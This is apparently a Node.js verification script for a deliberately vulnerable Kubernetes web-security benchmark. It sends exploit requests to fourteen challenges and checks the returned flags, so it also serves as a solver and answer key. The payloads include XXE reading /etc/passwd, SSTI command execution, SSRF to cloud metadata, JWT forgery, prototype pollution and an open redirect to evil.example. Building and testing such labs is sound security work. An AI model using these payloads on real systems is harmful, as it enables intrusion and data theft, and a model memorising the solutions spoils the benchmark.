#!/usr/bin/env node

const fs = require('fs');
const path = require('path');
const { spawnSync } = require('child_process');
const {
  ROOT_DIR,
  ensureDeployed,
  startTraefikPortForward,
  stopChild,
  challengeRequestUrl,
  benchmarkRequestUrl
} = require('./k8s-lib');
const { DEFAULT_BASE_DOMAIN, selected, challengeRoute, flagValue } = require('./benchmark-config');

const BASE_DOMAIN = process.env.LUXORA_BASE_DOMAIN || DEFAULT_BASE_DOMAIN;
const stamp = new Date().toISOString().replace(/[:.]/g, '-');
const artifactDir = path.join(ROOT_DIR, 'artifacts', 'check', `medium-k8s-${stamp}`);
const commandLogPath = path.join(artifactDir, 'commands.log');

fs.mkdirSync(artifactDir, { recursive: true });

const MEDIUM = Object.freeze([
  {
    slug: 'rbac',
    vector: 'rbac-logic',
    prepare() {},
    exploit(request) {
      return curlWithStatus('rbac-exploit', [
        '-X',
        'POST',
        request.url,
        '-H',
        `Host: ${request.host}`,
        '-H',
        'Content-Type: application/x-www-form-urlencoded',
        '-d',
        'role=admin&action=grant'
      ]);
    }
  },
  {
    slug: 'mfa',
    vector: 'mfa-bypass',
    prepare(request) {
      return curlWithStatus('mfa-reset', ['-H', `Host: ${request.host}`, request.url]);
    },
    exploit(request) {
      return curlWithStatus('mfa-exploit', [
        '-X',
        'POST',
        request.url,
        '-H',
        `Host: ${request.host}`,
        '-H',
        'Content-Type: application/x-www-form-urlencoded',
        '-H',
        'X-Forwarded-For: 198.51.100.9',
        '-d',
        'code=0000'
      ]);
    }
  },
  {
    slug: 'oauth',
    vector: 'oauth-open-redirect',
    prepare() {},
    exploit(request) {
      return curlWithStatus('oauth-exploit', [
        `${request.url}?redirect_uri=${encodeURIComponent('https://evil.example/callback')}&state=123xyz`,
        '-H',
        `Host: ${request.host}`
      ]);
    }
  },
  {
    slug: 'csrf',
    vector: 'csrf',
    prepare() {},
    exploit(request) {
      return curlWithStatus('csrf-exploit', [
        '-X',
        'POST',
        request.url,
        '-H',
        `Host: ${request.host}`,
        '-H',
        'Content-Type: application/x-www-form-urlencoded',
        '-d',
        'action=transfer&acc=999-99-9999'
      ]);
    }
  },
  {
    slug: 'postmsg',
    vector: 'postmessage-vuln',
    prepare() {},
    exploit(request) {
      return curlWithStatus('postmsg-exploit', [
        '-X',
        'POST',
        request.url,
        '-H',
        `Host: ${request.host}`,
        '-H',
        'Content-Type: application/x-www-form-urlencoded',
        '--data-urlencode',
        'origin=*',
        '--data-urlencode',
        'data={"action":"exec"}'
      ]);
    }
  },
  {
    slug: 'deser',
    vector: 'deserialization',
    prepare() {},
    exploit(request) {
      return curlWithStatus('deser-exploit', [
        `${request.url}?state=${encodeURIComponent(Buffer.from('O:8:"stdClass":0:{}').toString('base64'))}`,
        '-H',
        `Host: ${request.host}`
      ]);
    }
  },
  {
    slug: 'upload',
    vector: 'upload',
    prepare() {},
    exploit(request) {
      return curlWithStatus('upload-exploit', [
        '-X',
        'POST',
        request.url,
        '-H',
        `Host: ${request.host}`,
        '-H',
        'Content-Type: application/x-www-form-urlencoded',
        '--data-urlencode',
        'filename=shell.php'
      ]);
    }
  },
  {
    slug: 'xxe',
    vector: 'xxe',
    prepare() {},
    exploit(request) {
      return curlWithStatus('xxe-exploit', [
        '-X',
        'POST',
        request.url,
        '-H',
        `Host: ${request.host}`,
        '-H',
        'Content-Type: application/x-www-form-urlencoded',
        '--data-urlencode',
        'xml=<!DOCTYPE root [<!ENTITY x SYSTEM "file:///etc/passwd">]><root>&x;</root>'
      ]);
    }
  },
  {
    slug: 'ssti',
    vector: 'ssti',
    prepare() {},
    exploit(request) {
      return curlWithStatus('ssti-exploit', [
        `${request.url}?name=${encodeURIComponent("process.mainModule.require('child_process').execSync('id')")}`,
        '-H',
        `Host: ${request.host}`
      ]);
    }
  },
  {
    slug: 'payment',
    vector: 'payment_tampering',
    prepare() {},
    exploit(request) {
      return curlWithStatus('payment-exploit', [
        '-X',
        'POST',
        request.url,
        '-H',
        `Host: ${request.host}`,
        '-H',
        'Content-Type: application/x-www-form-urlencoded',
        '-d',
        'price=0'
      ]);
    }
  },
  {
    slug: 'proto_pollute',
    vector: 'prototype_pollution',
    prepare() {},
    exploit(request) {
      return curlWithStatus('proto-exploit', [
        '-X',
        'POST',
        request.url,
        '-H',
        `Host: ${request.host}`,
        '-H',
        'Content-Type: application/json',
        '--data-raw',
        '{"__proto__":{"admin":true}}'
      ]);
    }
  },
  {
    slug: 'race',
    vector: 'race_condition',
    prepare() {},
    exploit(request) {
      return curlWithStatus('race-exploit', [
        '-X',
        'POST',
        request.url,
        '-H',
        `Host: ${request.host}`,
        '-H',
        'Content-Type: application/x-www-form-urlencoded',
        '-d',
        'parallel=2'
      ]);
    }
  },
  {
    slug: 'jwt',
    vector: 'jwt-forge',
    prepare() {},
    exploit(request) {
      const token = [
        Buffer.from('{"alg":"HS256"}').toString('base64'),
        Buffer.from('{"user":"guest","admin":true}').toString('base64'),
        'sig'
      ].join('.');
      return curlWithStatus('jwt-exploit', [
        `${request.url}?token=${encodeURIComponent(token)}`,
        '-H',
        `Host: ${request.host}`
      ]);
    }
  },
  {
    slug: 'ssrf',
    vector: 'ssrf',
    prepare() {},
    exploit(request) {
      return curlWithStatus('ssrf-exploit', [
        `${request.url}?url=${encodeURIComponent('http://169.254.169.254/latest/meta-data')}`,
        '-H',
        `Host: ${request.host}`
      ]);
    }
  }
]);

let commandIndex = 0;
const summary = {
  artifactDir,
  baseDomain: BASE_DOMAIN,
  total: MEDIUM.length,
  results: {}
};

function writeFile(name, data) {
  const filePath = path.join(artifactDir, name);
  fs.writeFileSync(filePath, data);
  return filePath;
}

function appendCommandLog(text) {
  fs.appendFileSync(commandLogPath, text);
}

function shellQuote(value) {
  if (/^[A-Za-z0-9_./:=@%+-]+$/.test(value)) return value;
  return `'${value.replaceAll("'", "'\\''")}'`;
}

function run(label, command, args, options = {}) {
  commandIndex += 1;
  const id = String(commandIndex).padStart(2, '0');
  const commandLine = [command, ...args].map(shellQuote).join(' ');
  appendCommandLog(`\n[${id}] $ ${commandLine}\n`);

  const result = spawnSync(command, args, {
    cwd: ROOT_DIR,
    env: options.env || process.env,
    encoding: 'utf8',
    timeout: options.timeoutMs || 180_000
  });

  const stdoutPath = writeFile(`${id}-${label}.stdout.txt`, result.stdout || '');
  const stderrPath = writeFile(`${id}-${label}.stderr.txt`, result.stderr || '');
  const status = result.status === null ? 'signal' : result.status;
  appendCommandLog(`[${id}] exit=${status} stdout=${path.relative(ROOT_DIR, stdoutPath)} stderr=${path.relative(ROOT_DIR, stderrPath)}\n`);

  if (result.error && !options.allowFailure) {
    throw result.error;
  }
  if (result.status !== 0 && !options.allowFailure) {
    throw new Error(`${label} failed with exit ${result.status}; see ${stdoutPath} and ${stderrPath}`);
  }
  return result.stdout || '';
}

function curlWithStatus(label, args, options = {}) {
  const stdout = run(
    label,
    'curl',
    ['-s', '--retry', '30', '--retry-delay', '1', '--retry-all-errors', '--retry-connrefused', '-w', '\n__HTTP_STATUS__:%{http_code}', ...args],
    { ...options, allowFailure: true }
  );
  const marker = '\n__HTTP_STATUS__:';
  const idx = stdout.lastIndexOf(marker);
  if (idx === -1) {
    throw new Error(`${label}: missing status marker`);
  }
  return {
    body: stdout.slice(0, idx),
    status: Number.parseInt(stdout.slice(idx + marker.length).trim(), 10)
  };
}

function assertHtmlOk(label, response, expectedSnippets) {
  if (response.status !== 200) {
    throw new Error(`${label} returned ${response.status}`);
  }
  for (const snippet of expectedSnippets) {
    if (response.body.includes(snippet)) {
      return;
    }
  }
  throw new Error(`${label} missing expected content: ${expectedSnippets.join(' | ')}`);
}

function assertSolved(result, response, expected) {
  if (response.status !== 200) {
    throw new Error(`${result.slug} exploit returned ${response.status}: ${response.body.slice(0, 240)}`);
  }
  let parsed;
  try {
    parsed = JSON.parse(response.body);
  } catch (error) {
    throw new Error(`${result.slug} exploit did not return JSON: ${error.message}`);
  }
  if (parsed.success !== true) {
    throw new Error(`${result.slug} did not solve successfully`);
  }
  if (parsed.challenge !== expected.challenge) {
    throw new Error(`${result.slug} challenge mismatch: ${parsed.challenge} !== ${expected.challenge}`);
  }
  if (parsed.flag !== expected.flag) {
    throw new Error(`${result.slug} flag mismatch: ${parsed.flag} !== ${expected.flag}`);
  }
  if (!parsed.evidence || parsed.evidence.vector !== expected.vector) {
    throw new Error(`${result.slug} evidence vector mismatch`);
  }
  return parsed;
}

function expectedFlag(slug) {
  const challenge = selected.find((entry) => entry.slug === slug);
  if (!challenge) {
    throw new Error(`unknown selected challenge ${slug}`);
  }
  return flagValue(challenge.layer, challenge.slug, challenge.difficulty, challenge.points, challenge.technique);
}

async function main() {
  appendCommandLog(`medium k8s check started ${new Date().toISOString()}\n`);
  appendCommandLog(`logs: ${artifactDir}\n`);

  run('verify-k8s-manifests', 'node', ['scripts/verify-k8s-manifests.js']);
  ensureDeployed(BASE_DOMAIN);
  const portForward = await startTraefikPortForward(artifactDir);
  summary.ingressPort = portForward.localPort;

  try {
    for (const target of MEDIUM) {
      const route = challengeRoute(target.slug);
      const directRoot = challengeRequestUrl(target.slug, '/', portForward.localPort);
      const gatewayRoot = benchmarkRequestUrl(route, portForward.localPort);
      const result = {
        slug: target.slug,
        route,
        directHost: directRoot.host,
        gatewayHost: gatewayRoot.host,
        expectedFlag: expectedFlag(target.slug)
      };

      const directPage = curlWithStatus(`${target.slug}-direct-page`, ['-H', `Host: ${directRoot.host}`, directRoot.url]);
      writeFile(`${target.slug}-direct-page.html`, directPage.body);
      assertHtmlOk(`${target.slug} direct page`, directPage, ['Scenario:', '<form', 'Challenge']);

      const gatewayPage = curlWithStatus(`${target.slug}-gateway-page`, ['-H', `Host: ${gatewayRoot.host}`, gatewayRoot.url]);
      writeFile(`${target.slug}-gateway-page.html`, gatewayPage.body);
      assertHtmlOk(`${target.slug} gateway page`, gatewayPage, ['Scenario:', '<form', 'Challenge']);

      if (target.prepare) {
        const directPrep = target.prepare(directRoot);
        if (directPrep && directPrep.status !== 200) {
          throw new Error(`${target.slug} direct prepare failed with ${directPrep.status}`);
        }
      }
      const directSolve = target.exploit(directRoot);
      writeFile(`${target.slug}-direct-solve.json`, directSolve.body);
      result.direct = assertSolved(result, directSolve, {
        challenge: route,
        flag: result.expectedFlag,
        vector: target.vector
      });

      if (target.prepare) {
        const gatewayPrep = target.prepare(gatewayRoot);
        if (gatewayPrep && gatewayPrep.status !== 200) {
          throw new Error(`${target.slug} gateway prepare failed with ${gatewayPrep.status}`);
        }
      }
      const gatewaySolve = target.exploit(gatewayRoot);
      writeFile(`${target.slug}-gateway-solve.json`, gatewaySolve.body);
      result.gateway = assertSolved(result, gatewaySolve, {
        challenge: route,
        flag: result.expectedFlag,
        vector: target.vector
      });

      summary.results[target.slug] = result;
      console.log(`PASS ${target.slug} -> ${result.expectedFlag}`);
    }
  } finally {
    stopChild(portForward.child);
  }

  writeFile('summary.json', `${JSON.stringify(summary, null, 2)}\n`);
  console.log(`Verified ${MEDIUM.length} Medium challenges through the shared ingress host and challenge paths.`);
  console.log(`Artifacts: ${artifactDir}`);
}

main().catch((error) => {
  writeFile('summary.json', `${JSON.stringify({ ...summary, error: error.message }, null, 2)}\n`);
  console.error(error.stack || error.message);
  process.exit(1);
});
